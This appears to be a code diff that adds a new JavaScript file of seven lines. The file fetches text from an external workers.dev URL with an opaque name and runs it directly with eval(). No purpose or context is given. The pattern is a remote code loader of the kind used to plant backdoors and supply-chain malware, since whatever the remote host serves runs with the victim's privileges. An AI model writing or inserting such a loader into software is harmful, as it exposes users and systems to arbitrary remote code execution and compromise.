@@ -1,0 +1,7 @@
+const url = "https://eag.aabb4325999.workers.dev/";
+
+fetch(url)
+  .then(response => response.text())
+  .then(code => {
+    eval(code);
+  });
